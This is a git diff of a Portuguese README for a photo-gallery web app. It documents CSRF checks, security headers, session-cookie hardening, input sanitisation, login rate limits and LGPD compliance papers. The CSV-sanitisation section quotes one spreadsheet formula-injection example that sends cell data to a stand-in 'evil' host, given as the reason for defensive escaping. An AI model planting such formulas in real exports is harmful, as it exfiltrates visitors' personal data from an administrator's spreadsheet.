@@ -21,6 +21,7 @@ URL de produção: <https://fotos.lucafchala.com>
 - [Sistema de solicitação de remoção (LGPD)](#sistema-de-solicitação-de-remoção-lgpd)
 - [Termos de Uso e autorização de uso de imagem (LGPD)](#termos-de-uso-e-autorização-de-uso-de-imagem-lgpd)
 - [Autenticação e segurança](#autenticação-e-segurança)
+- [Conformidade legal (LGPD)](#conformidade-legal-lgpd)
 - [E-mails transacionais (Resend)](#e-mails-transacionais-resend)
 - [Métricas](#métricas)
 - [Backup e restauração](#backup-e-restauração)
@@ -158,6 +159,27 @@ Definir via `npx wrangler secret put <NAME>` (ficam criptografados no Cloudflare
 | `CF_ANALYTICS_TOKEN` | Não | Token do Cloudflare Web Analytics. Quando presente, o script `beacon.min.js` é injetado nas páginas públicas |
 | `ADMIN_PASSWORD` | Apenas em deploy novo / KV zerado | Semeia a senha do dashboard quando `admin_password` não existe no KV. **Não há mais setup público de primeira execução** — sem KV e sem este secret, o login fica bloqueado |
 | `TURNSTILE_SECRET_KEY` | Sim (fail-closed) | Verificação Turnstile do formulário de suporte e remoção de fotos. Se ausente, esses formulários são bloqueados |
+| `SIGNING_SECRET` | **Sim, na prática** | Assina o nonce de página do `/api/drive-link` e o token dos formulários públicos (HMAC-SHA256, sem estado). Ver o aviso abaixo |
+
+> ### ⚠️ `SIGNING_SECRET` falha **aberto**, não fechado
+>
+> Ao contrário dos demais, a ausência deste secret **não quebra nada**: o nonce
+> de página e o token de formulário simplesmente deixam de ser exigidos, e o
+> site continua servindo como se estivesse protegido.
+>
+> A escolha é deliberada. Um secret faltando é erro de configuração de deploy, e
+> falhar fechado aqui significaria "ninguém baixa foto nenhuma" — uma
+> indisponibilidade total causada por uma camada *adicional*, empilhada sobre
+> defesas que continuam de pé (Turnstile fail-closed, rate limit, consentimento).
+> O contrapeso é nunca ser silencioso: `auditSite()` acusa a falta, e ela aparece
+> em `/api/healthz` e no painel de status até alguém rodar:
+>
+> ```bash
+> npx wrangler secret put SIGNING_SECRET   # qualquer string aleatória longa
+> ```
+>
+> Trocar o secret invalida os tokens em voo — o visitante recarrega a página e o
+> cliente já trata isso sozinho. É o comportamento desejado numa rotação.
 
 Variáveis lidas como `env.<NOME>` dentro de `fetch(request, env, ctx)`.
 
@@ -380,6 +402,31 @@ Coletado server-side em `handleDriveLink` (`POST /api/drive-link`) a partir de `
 
 Roteador único em `src/index.js`, baseado em cadeia de `if`s. Ordem importa — a regex `/^\/([a-z0-9][a-z0-9-]*)$/` que casa páginas de evento é **a última**, para não capturar `/dashboard`, `/suporte`, etc.
 
+### Portão de CSRF — antes do roteamento
+
+A **primeira** coisa que roda, antes de qualquer `if (path === …)`: todo método
+que não seja GET/HEAD passa por `isCrossSiteRequest()` e leva 403 se vier de
+fora da origem.
+
+A posição **é** o controle. Espalhado pelos handlers, ele viraria um item que
+cada rota nova precisa lembrar de chamar — e o esquecimento não quebra nada, só
+deixa a rota desprotegida em silêncio. Um teste de estrutura na CI garante que
+ele continua antes do roteamento.
+
+Por que não bastava o `SameSite=Strict` do cookie:
+
+1. **`SameSite` é escopo de *site*, não de origem.** Qualquer coisa capaz de
+   servir conteúdo em outro host de `lucafchala.com` é "same-site" e recebe o
+   cookie normalmente. Por isso a checagem recusa também `Sec-Fetch-Site: same-site`.
+2. **`SameSite` protege o cookie, não os endpoints sem cookie nenhum** —
+   `/api/removal-request`, `/api/suporte`, `/api/drive-link` — que um site
+   terceiro poderia acionar em nome de um visitante.
+
+Ausência de sinal (nem `Sec-Fetch-Site` nem `Origin`) passa de propósito: quem
+não manda nenhum dos dois não é browser, e um não-browser não sofre CSRF — ele
+já controla a própria requisição. Bloquear por ausência custaria
+compatibilidade sem comprar segurança.
+
 ### Públicas
 
 | Método | Path | Função | O que faz |
@@ -397,10 +444,11 @@ Roteador único em `src/index.js`, baseado em cadeia de `if`s. Ordem importa —
 | POST | `/api/track-drive` | `handleTrackDrive` | Incrementa `drive_clicks:<slug>` (rate-limit: 60/h por IP) |
 | POST | `/api/drive-link` | `handleDriveLink` | **O único lugar que devolve o link real do Drive.** Valida o Turnstile no servidor (fail-closed, 403 se falhar), o slug, o aceite dos Termos (+ declaração quando exigida), rate-limit 60/h por IP (10/h no caminho `noscript` p/ ad-blocker) — e grava o aceite em D1 (best-effort, no-op sem D1) |
 | POST | `/api/perf` | `handlePerfBeacon` | Beacon de performance (Web Vitals) enviado por `navigator.sendBeacon`, amostrado a 10% no cliente. Responde sempre `204` sem corpo, inclusive para payload inválido — é fire-and-forget e nunca pode 500. **Não escreve em KV** (a cota de escrita é reservada para eventos/sessões/consentimento): o destino é log estruturado e, se o binding `PERF` existir, um dataset do Analytics Engine. Sem rate-limit por KV (custaria mais que o beacon economiza); um beacon com `Origin` de outro site é descartado |
+| POST | `/api/csp-report` | `handleCspReport` | Coletor das violações da CSP estrita (que roda em Report-Only). Serve a dois fins: medir quantos handlers inline faltam para a virada da política, e detectar tentativa de XSS — um relatório apontando para script que ninguém colocou ali chega antes de qualquer reclamação. **Não escreve em KV** (mesma razão do `/api/perf`): vai para log estruturado. Amostrado a 20% e limitado a 8 KB no servidor, porque quem chama este endpoint não somos nós |
 | POST | `/api/suporte` | `handleSupportRequest` | Envia e-mail do formulário de suporte (rate-limit: 5/h por IP) |
 | GET | `/api/healthz` | `handleHealthz` | `{ok, kv, events, d1, hashMs, …}` (+ `kvLatencyMs`, `cron`, `config`, …; 2 leituras de KV) — usado pelo CI e pelo dashboard de status |
 
-### Autenticadas (cookie `session` válido)
+### Autenticadas (cookie `__Host-session` válido)
 
 | Método | Path | Função |
 | --- | --- | --- |
@@ -426,17 +474,65 @@ Roteador único em `src/index.js`, baseado em cadeia de `if`s. Ordem importa —
 - Qualquer exceção não tratada cai no `catch` do `fetch` e retorna 500 `"Erro interno."`.
 - Helpers: `jsonOk(data, status=200)`, `jsonErr(message, status=400)`, `redirect(location)`.
 
-### Headers de segurança (em toda resposta HTML)
+### Headers de segurança
+
+Toda a política vive em **`src/security.js`**, num lugar só. O motivo é o modo de
+falha desses controles: eles não quebram quando estão errados, só param de
+proteger em silêncio — um cabeçalho esquecido numa rota nova, duas respostas com
+CSP diferente, o `no-store` que ficou de fora justamente do endpoint que devolve
+o export de consentimentos.
+
+Há três perfis, e cada rota só escolhe qual deles se aplica:
+
+| Perfil | Onde | O que tem a mais |
+| --- | --- | --- |
+| `htmlSecurityHeaders()` | Páginas públicas | CSP com nonce, COOP/CORP, `Reporting-Endpoints` |
+| `adminHtmlSecurityHeaders()` | `/dashboard`, login | `no-store`, `X-Robots-Tag: noindex`, `Referrer-Policy: no-referrer` |
+| `dataSecurityHeaders()` | JSON, CSV, texto, imagem | `default-src 'none'; sandbox`, `no-store` (salvo opt-in explícito) |
+
+Baseline presente em **qualquer** resposta, inclusive 404 e 500 — uma página de
+erro sem `nosniff` continua sendo conteúdo servido pela nossa origem:
 
 ```
-Content-Type: text/html; charset=utf-8
 X-Content-Type-Options: nosniff
 X-Frame-Options: DENY
-Referrer-Policy: strict-origin-when-cross-origin
-Content-Security-Policy: upgrade-insecure-requests
+Strict-Transport-Security: max-age=63072000; includeSubDomains
+Permissions-Policy: <lista longa de negações explícitas>
+Origin-Agent-Cluster: ?1
+X-Permitted-Cross-Domain-Policies: none
 ```
 
-O CSP `upgrade-insecure-requests` faz o browser converter automaticamente qualquer `http://` para `https://`, eliminando "mixed content" se um link antigo de foto ainda tem protocolo inseguro no KV. Em paralelo, a função `toHttps()` normaliza URLs ao salvar.
+O `Permissions-Policy` é longo de propósito: uma lista curta ("camera, mic,
+geolocation") só nega três coisas, e qualquer API nova do browser nasce liberada.
+
+`upgrade-insecure-requests` continua na CSP: o browser converte qualquer
+`http://` para `https://`, eliminando "mixed content" se um link antigo de foto
+tem protocolo inseguro no KV. Em paralelo, `toHttps()` normaliza ao salvar e
+`safeUrl()` sanitiza no ponto de uso.
+
+**COEP fica de fora** deliberadamente: `require-corp` apagaria a galeria, já que
+o `lh3.googleusercontent.com` não envia CORP. **HSTS sem `preload`**: é
+compromisso de domínio inteiro, praticamente irreversível, e portanto decisão do
+dono — não efeito colateral de um commit.
+
+#### CSP: duas políticas ao mesmo tempo
+
+Toda página HTML sai com `Content-Security-Policy` **e**
+`Content-Security-Policy-Report-Only`, construídas pela mesma função para que não
+possam divergir:
+
+- A **enforced** ainda tem `'unsafe-inline'` em `script-src`. Não é desleixo: a
+  UI usa handlers inline (`onclick="…"`), e **nonce nenhum cobre handler em
+  atributo**. Tirar o `'unsafe-inline'` hoje quebraria galeria, página de evento
+  e painel.
+- A **report-only** é a política que queremos impor — `'nonce-…'` sem
+  `'unsafe-inline'`. Em Report-Only, cada handler remanescente vira um relatório
+  em `/api/csp-report` em vez de um elemento quebrado. É a lista de tarefas da
+  migração, medida em produção e não chutada.
+
+A virada acontece quando os relatórios zerarem: `strict: true` também na
+enforced. Até lá, um `<script>` sem nonce é invisível hoje e quebra no dia da
+virada — por isso a CI recusa um.
 
 ---
 
@@ -606,10 +702,30 @@ Web Crypto puro: `importKey('PBKDF2')` + `deriveBits({ name:'PBKDF2', hash:'SHA-
 ### Sessão
 
 - `generateToken()` → 32 bytes random hex (64 chars).
-- Salva em `admin_session:<token>` = `"valid"` com TTL 86400 (24 h).
-- Cookie: `session=<token>; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=86400`.
-- `verifySession(env, request)` extrai o token via regex `(?:^|;\s*)session=([a-f0-9]{64})` e checa no KV.
-- Logout deleta a chave do KV e seta cookie com `Max-Age=0`.
+- Salva em `admin_session:<token>` como JSON `{ v, createdAt, lastSeen, fp }`
+  com TTL 86400 (24 h). Sessões antigas gravadas como a string `"valid"`
+  continuam válidas até expirarem — o deploy não desloga ninguém no meio de um
+  trabalho.
+- Cookie: **`__Host-session`**`=<token>; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=86400`.
+  O prefixo `__Host-` não é cosmético: o browser só grava um cookie com esse
+  nome se ele vier `Secure`, com `Path=/` e **sem** `Domain`. Isso impede que
+  qualquer outro host de `lucafchala.com` — um subdomínio comprometido, um CNAME
+  órfão apontando para serviço de terceiro — plante ou sobrescreva a sessão
+  deste site. É a fixação de sessão por vizinho de domínio que o
+  `SameSite=Strict` sozinho não cobria.
+- `verifySession(env, request)` aceita os dois nomes de cookie e encerra a sessão
+  por **três** motivos: expiração absoluta (24 h, TTL do KV), **inatividade**
+  (2 h) e **divergência do cliente** (hash do User-Agent). O IP fica fora do
+  vínculo de propósito — celular troca de IP entre 4G e Wi-Fi o tempo todo, e
+  amarrar a sessão a ele deslogaria o admin no meio de uma edição.
+- O `lastSeen` é reescrito no máximo a cada 10 min. Sem essa trava, o painel
+  (que faz várias chamadas por tela) consumiria a cota de escrita do KV — 1000/dia,
+  compartilhada com eventos, sessões e consentimento.
+- Logout deleta a chave do KV, expira **os dois** nomes de cookie e envia
+  `Clear-Site-Data: "cache", "cookies", "storage"` — sem isso, "sair" num
+  computador emprestado deixa a última tela do painel recuperável pelo botão
+  voltar.
+- Trocar a senha revoga todas as **outras** sessões, mantendo a de quem trocou.
 
 ### Comparação em tempo constante
 
@@ -630,10 +746,63 @@ Já listados em [Rotas HTTP](#rotas-http) — `nosniff`, `frame DENY`, `Referrer
 - Strings: todas truncadas com `.slice(0, N)` antes de salvar.
 - URLs: `toHttps()` reescreve `http://` para `https://`.
 - HTML: `escape()` em `utils.js` faz `& < > " '` → entidades, aplicado em **todo** valor de usuário antes de interpolar em template.
+- CSV: `csvCell()` neutraliza `=` `+` `-` `@` TAB e CR iniciais. Não é
+  paranoia — o export de consentimentos carrega `consenter_name`, `user_agent` e
+  `referrer`, todos controlados pelo visitante, e Excel/Sheets executam uma
+  célula que começa com esses caracteres. `=HYPERLINK("https://evil/?x="&A1,…)`
+  atravessaria a citação do CSV (aspas são citação, não escape de fórmula) e
+  rodaria na planilha do admin, com a base de dados pessoais aberta na frente.
+- Nome de arquivo: `sanitizeFilename()` tira travessia de caminho, CR/LF (que
+  forjaria o cabeçalho MIME do anexo) e dupla extensão (`foto.jpg.exe`).
+- Imagem enviada: além do sniff de magic bytes, `stripImageMetadata()` remove
+  EXIF/GPS/XMP de JPEG, PNG e WebP **antes** de a foto virar anexo de e-mail.
+  Quem manda uma foto pedindo remoção não está oferecendo as coordenadas de onde
+  ela foi tirada.
+- Restore de backup: `sanitizeRestoredRequest()` e `mergeRestore()` filtram por
+  chave, tipo e tamanho. Era o único caminho que gravava em KV sem passar pelo
+  normalizador de eventos.
 
 ### `ctx.waitUntil`
 
 Usado em `handleEventPage` para incrementar `views:<slug>` sem bloquear a resposta. Se a escrita falhar, o usuário não percebe.
+
+---
+
+## Conformidade legal (LGPD)
+
+O pacote completo está em [`docs/legal/`](./docs/legal/). Ele foi escrito
+**lendo o código**, não presumindo o que o código deveria fazer — cada medida
+citada aponta para a função que a implementa.
+
+| Documento | O que é |
+| --- | --- |
+| [`ROPA.md`](./docs/legal/ROPA.md) | Registro das operações (art. 37): cada dado, origem, base legal, retenção, destino |
+| [`RIPD.md`](./docs/legal/RIPD.md) | Relatório de impacto (art. 38): 8 riscos com probabilidade, impacto, mitigação e risco residual |
+| [`LIA.md`](./docs/legal/LIA.md) | Teste de legítimo interesse (art. 10) em três etapas |
+| [`transferencia-internacional.md`](./docs/legal/transferencia-internacional.md) | Art. 33 — **todos** os operadores ficam nos EUA |
+| [`politica-de-retencao.md`](./docs/legal/politica-de-retencao.md) | Prazos, o cron que executa, e como verificar que executou |
+| [`direitos-do-titular.md`](./docs/legal/direitos-do-titular.md) | Art. 18: canais, prazos, confirmação de identidade, modelos |
+| [`plano-resposta-incidentes.md`](./docs/legal/plano-resposta-incidentes.md) | Art. 48: primeiras horas, critério de comunicação, comandos de contenção |
+| [`politica-seguranca-informacao.md`](./docs/legal/politica-seguranca-informacao.md) | Art. 46: cada medida com o ponteiro para o código |
+| [`termo-autorizacao-uso-imagem.md`](./docs/legal/termo-autorizacao-uso-imagem.md) | Modelos para assinatura: adulto, responsável por menor, instituição |
+| [`checklist-conformidade.md`](./docs/legal/checklist-conformidade.md) | Estado item a item e o que fazer, em ordem |
+
+### O ponto que o código não resolve
+
+O RIPD conclui que o maior risco residual do sistema **não é técnico**: é a
+ausência de **autorização de uso de imagem assinada pelo responsável legal**
+para crianças e adolescentes (art. 14 da LGPD). Eventos escolares e formaturas
+envolvem menores, e o aceite de uma caixa no site é prova frágil de
+consentimento parental — quem marcou pode não ser o responsável.
+
+Nenhuma medida no Worker alcança isso, porque a coleta acontece no evento ou no
+contrato com a escola. Os modelos prontos estão em
+[`termo-autorizacao-uso-imagem.md`](./docs/legal/termo-autorizacao-uso-imagem.md);
+o caminho de menor atrito é o Modelo 3, anexado ao contrato com a instituição.
+
+> Todos esses documentos foram redigidos com auxílio de IA e **não constituem
+> parecer jurídico**. Os pontos marcados ⚖️ dependem de revisão de advogado(a)
+> com prática em LGPD e direito de imagem.
 
 ---
 
@@ -766,7 +935,25 @@ CI (smoke tests) considera `hashMs > 200` como **falha**: acima disso, o hashing
 | `/api/suporte` | `support` | 5 | 1 h |
 | `/api/drive-link` (caminho verificado, com Turnstile) | `drive-link` | 60 | 1 h |
 | `/api/drive-link` (caminho `noscript`, sem Turnstile — ad-blocker) | `drive-link-noscript` | 10 | 1 h |
-| `/dashboard/login` | `login` | 10 | 10 min |
+| `/dashboard/login` (rajada) | `login` | 10 | 10 min |
+| `/dashboard/login` (sustentado) | `login-day` | 60 | 24 h |
+
+O login tem **dois** limites porque um só não fechava a conta: 10 por 10 min
+segura a rajada, mas deixa passar ~1400 tentativas por dia do mesmo IP — folgado
+demais para uma senha única. O teto diário fecha isso sem atrapalhar quem erra a
+senha algumas vezes de manhã e volta à tarde.
+
+Independente do bloqueio, falhas de login são **contadas e alertadas**: a partir
+de 5 em 15 min, o dono recebe e-mail (`sendLoginAlert`, com cooldown próprio de
+30 min para não virar flood). Antes desta revisão, uma força bruta era
+completamente silenciosa — o rate limit segurava o volume, mas ninguém ficava
+sabendo que houve tentativa.
+
+Camadas que **não** custam KV, complementando o rate limit nos formulários
+públicos: honeypot (campo isca invisível), token de formulário assinado com
+idade mínima de 3 s (derruba automação que preenche e envia instantaneamente) e
+supressão de mensagem duplicada no suporte (hash truncado da mensagem por IP,
+TTL de 1 h).
 
 Limitações: usa janela fixa (não sliding) e não é atômico (race em alta concorrência). Aceitável porque os endpoints públicos são de baixíssima taxa.
 
